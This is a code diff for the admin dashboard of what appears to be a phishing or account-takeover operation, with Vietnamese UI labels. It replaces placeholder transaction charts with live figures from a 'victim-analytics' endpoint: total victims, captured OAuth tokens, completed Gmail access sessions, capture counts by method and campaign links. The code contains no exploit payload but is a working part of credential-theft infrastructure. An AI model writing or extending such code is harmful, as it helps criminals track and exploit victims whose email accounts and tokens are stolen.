@@ -20,6 +20,7 @@ import {
   Wifi,
   WifiOff
 } from 'lucide-react';
+import { Mail } from 'lucide-react';
 import { useWebSocket, WebSocketMessage } from '../../shared/hooks/use-websocket';
 import { useToast } from '../../shared/hooks/use-toast';
 import { Target, AlertTriangle, Server, Activity as ActivityIcon } from 'lucide-react';
@@ -89,8 +90,7 @@ interface RecentActivity {
 
 interface ChartData {
   registrations_by_status: Array<{ name: string; value: number; color: string }>;
-  transactions_by_month: Array<{ month: string; amount: number; count: number }>;
-  verifications_by_type: Array<{ type: string; count: number }>;
+  capture_by_method: Array<{ method: string; count: number; color: string }>;
 }
 
 export default function Dashboard() {
@@ -222,6 +222,17 @@ export default function Dashboard() {
         }>;
       }>('/admin/dashboard');
 
+      const analytics = await AuthService.apiRequest<{
+        total: number;
+        byCaptureMethod: Record<string, number>;
+        registrationStats: { completed: number; pending: number };
+      }>('/admin/dashboard/victim-analytics');
+
+      const systemHealth = await AuthService.apiRequest<{
+        database: string;
+        timestamp: string;
+      }>('/admin/dashboard/system-health').catch(() => ({ database: 'warning', timestamp: new Date().toISOString() } as any));
+
       // Transform to DashboardStats format
       const transformedStats: DashboardStats = {
         total_registrations: dashboardData.statistics.totalVictims,
@@ -233,7 +244,7 @@ export default function Dashboard() {
         total_gmail_access: dashboardData.statistics.totalGmailAccess,
         registration_completed: dashboardData.statistics.registrationCompleted,
         registration_rate: parseFloat(dashboardData.statistics.registrationRate),
-        pending_registrations: 0,
+        pending_registrations: analytics.registrationStats.pending,
         under_review_registrations: 0,
         approved_registrations: dashboardData.statistics.registrationCompleted,
         rejected_registrations: 0,
@@ -248,7 +259,7 @@ export default function Dashboard() {
         high_value_victims: 0,
         oauth_captures: dashboardData.statistics.totalOAuthTokens,
         system_health: {
-          database: 'healthy',
+          database: (systemHealth as any).database || 'healthy',
           api: 'healthy',
           websocket: 'healthy',
           background_jobs: 'healthy',
@@ -262,7 +273,7 @@ export default function Dashboard() {
           high_value_count: 0,
         })),
         victim_analytics: {
-          by_capture_method: {},
+          by_capture_method: analytics.byCaptureMethod,
           by_market_value: {},
           by_campaign: {},
           daily_captures: [],
@@ -273,26 +284,17 @@ export default function Dashboard() {
       setActivities([]); // Activities will come from WebSocket
 
       // Generate chart data from stats
+      const captureColors = ['#0ea5e9', '#10b981', '#f59e0b', '#6366f1', '#ef4444', '#14b8a6'];
       setChartData({
         registrations_by_status: [
           { name: 'Pending', value: transformedStats.pending_registrations, color: '#fbbf24' },
-          { name: 'Under Review', value: transformedStats.under_review_registrations, color: '#3b82f6' },
-          { name: 'Approved', value: transformedStats.approved_registrations, color: '#10b981' },
-          { name: 'Rejected', value: transformedStats.rejected_registrations, color: '#ef4444' }
+          { name: 'Approved', value: transformedStats.approved_registrations, color: '#10b981' }
         ],
-        transactions_by_month: [
-          { month: 'Jan', amount: 125000, count: 45 },
-          { month: 'Feb', amount: 156000, count: 67 },
-          { month: 'Mar', amount: 189000, count: 89 },
-          { month: 'Apr', amount: 203000, count: 102 },
-          { month: 'May', amount: 234000, count: 125 },
-          { month: 'Jun', amount: 267000, count: 143 }
-        ],
-        verifications_by_type: [
-          { type: 'Business', count: 145 },
-          { type: 'Personal', count: 89 },
-          { type: 'Document', count: 234 }
-        ]
+        capture_by_method: Object.entries(analytics.byCaptureMethod || {}).map(([method, count], idx) => ({
+          method,
+          count: count as number,
+          color: captureColors[idx % captureColors.length]
+        }))
       });
 
     } catch (err) {
@@ -405,66 +407,56 @@ export default function Dashboard() {
         </div>
       </div>
 
-      {/* Key Metrics */}
+      {/* Key Metrics - real data only */}
       <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
         <Card>
           <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
-            <CardTitle className="text-sm font-medium">Tổng đăng ký</CardTitle>
+            <CardTitle className="text-sm font-medium">Tổng nạn nhân</CardTitle>
             <Users className="h-4 w-4 text-muted-foreground" />
           </CardHeader>
           <CardContent>
             <div className="text-2xl font-bold">{stats?.total_registrations.toLocaleString()}</div>
-            <p className="text-xs text-muted-foreground">
-              +{stats?.new_registrations_this_week} tuần này
-            </p>
+            <p className="text-xs text-muted-foreground">Trong 24h: {stats?.recent_victims}</p>
           </CardContent>
         </Card>
 
         <Card>
           <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
-            <CardTitle className="text-sm font-medium">Chờ duyệt</CardTitle>
-            <Clock className="h-4 w-4 text-yellow-500" />
+            <CardTitle className="text-sm font-medium">Hoàn tất đăng ký</CardTitle>
+            <CheckCircle className="h-4 w-4 text-green-500" />
           </CardHeader>
           <CardContent>
-            <div className="text-2xl font-bold text-yellow-600">
-              {stats?.pending_registrations.toLocaleString()}
-            </div>
-            <p className="text-xs text-muted-foreground">
-              Cần xem xét ngay
-            </p>
+            <div className="text-2xl font-bold text-green-600">{stats?.approved_registrations?.toLocaleString()}</div>
+            <p className="text-xs text-muted-foreground">Tỉ lệ: {stats?.registration_rate}%</p>
           </CardContent>
         </Card>
 
         <Card>
           <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
-            <CardTitle className="text-sm font-medium">Giao dịch</CardTitle>
-            <DollarSign className="h-4 w-4 text-green-500" />
+            <CardTitle className="text-sm font-medium">OAuth Tokens</CardTitle>
+            <ActivityIcon className="h-4 w-4 text-blue-500" />
           </CardHeader>
           <CardContent>
-            <div className="text-2xl font-bold">{stats?.total_transactions.toLocaleString()}</div>
-            <p className="text-xs text-muted-foreground">
-              {formatCurrency(stats?.total_volume || 0)} tổng giá trị
-            </p>
+            <div className="text-2xl font-bold">{stats?.total_oauth_tokens?.toLocaleString()}</div>
+            <p className="text-xs text-muted-foreground">Tokens đang hoạt động</p>
           </CardContent>
         </Card>
 
         <Card>
           <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
-            <CardTitle className="text-sm font-medium">Xác minh</CardTitle>
-            <FileText className="h-4 w-4 text-blue-500" />
+            <CardTitle className="text-sm font-medium">Gmail Access</CardTitle>
+            <Mail className="h-4 w-4 text-purple-500" />
           </CardHeader>
           <CardContent>
-            <div className="text-2xl font-bold">{stats?.total_verifications.toLocaleString()}</div>
-            <p className="text-xs text-muted-foreground">
-              {stats?.pending_verifications} chờ xác minh
-            </p>
+            <div className="text-2xl font-bold">{stats?.total_gmail_access?.toLocaleString()}</div>
+            <p className="text-xs text-muted-foreground">Phiên đã hoàn tất</p>
           </CardContent>
         </Card>
       </div>
 
-      {/* Charts Section */}
+      {/* Charts Section - use real analytics */}
       <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
-        {/* Registration Status Chart */}
+        {/* Registration Status */}
         <Card>
           <CardHeader>
             <CardTitle className="flex items-center gap-2">
@@ -490,25 +482,23 @@ export default function Dashboard() {
           </CardContent>
         </Card>
 
-        {/* Monthly Transactions */}
+        {/* Capture by method */}
         <Card>
           <CardHeader>
             <CardTitle className="flex items-center gap-2">
               <BarChart3 className="h-5 w-5" />
-              Giao dịch theo tháng
+              Phân bố theo phương thức capture
             </CardTitle>
           </CardHeader>
           <CardContent>
             <div className="space-y-3">
-              {chartData?.transactions_by_month.slice(-6).map((item, index) => (
-                <div key={item.month} className="flex items-center justify-between">
-                  <span className="text-sm font-medium">{item.month}</span>
-                  <div className="flex items-center gap-4">
-                    <span className="text-sm text-gray-600">{item.count} giao dịch</span>
-                    <span className="text-sm font-semibold">
-                      {formatCurrency(item.amount)}
-                    </span>
+              {chartData?.capture_by_method.map((item) => (
+                <div key={item.method} className="flex items-center justify-between">
+                  <div className="flex items-center gap-3">
+                    <div className="w-3 h-3 rounded-full" style={{ backgroundColor: item.color }}></div>
+                    <span className="text-sm font-medium">{item.method}</span>
                   </div>
+                  <Badge variant="secondary">{item.count}</Badge>
                 </div>
               ))}
             </div>
@@ -561,8 +551,8 @@ export default function Dashboard() {
                 className="w-full justify-start" 
                 onClick={() => window.location.href = '/admin#/registrations?status=pending'}
               >
-                <Clock className="h-4 w-4 mr-2" />
-                Xem đăng ký chờ duyệt ({stats?.pending_registrations})
+                <CheckCircle className="h-4 w-4 mr-2" />
+                Đăng ký hoàn tất ({stats?.approved_registrations})
               </Button>
               
               <Button 
@@ -570,8 +560,8 @@ export default function Dashboard() {
                 className="w-full justify-start"
                 onClick={() => window.location.href = '/admin#/verifications?status=pending'}
               >
-                <AlertCircle className="h-4 w-4 mr-2" />
-                Xem xác minh chờ duyệt ({stats?.pending_verifications})
+                <Users className="h-4 w-4 mr-2" />
+                Xem chiến dịch ({stats?.total_campaigns})
               </Button>
               
               <Button 
@@ -579,8 +569,8 @@ export default function Dashboard() {
                 className="w-full justify-start"
                 onClick={() => window.location.href = '/admin#/transactions'}
               >
-                <TrendingUp className="h-4 w-4 mr-2" />
-                Xem giao dịch hôm nay
+                <ActivityIcon className="h-4 w-4 mr-2" />
+                OAuth tokens ({stats?.total_oauth_tokens})
               </Button>
               
               <Button 
@@ -588,8 +578,8 @@ export default function Dashboard() {
                 className="w-full justify-start"
                 onClick={() => window.location.href = '/admin#/settings'}
               >
-                <Users className="h-4 w-4 mr-2" />
-                Quản lý người dùng
+                <BarChart3 className="h-4 w-4 mr-2" />
+                Phân tích nạn nhân
               </Button>
             </div>
           </CardContent>
